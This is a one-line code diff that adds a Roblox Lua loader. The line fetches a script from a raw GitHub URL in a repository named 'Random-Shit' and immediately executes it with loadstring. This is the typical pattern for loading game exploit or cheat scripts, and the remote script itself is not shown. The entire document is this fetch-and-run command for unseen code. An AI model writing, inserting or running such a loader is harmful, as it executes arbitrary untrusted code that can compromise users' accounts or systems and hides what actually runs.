@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconLords/Random-Shit/main/BACONLORD%20SO%20GOOD"))()
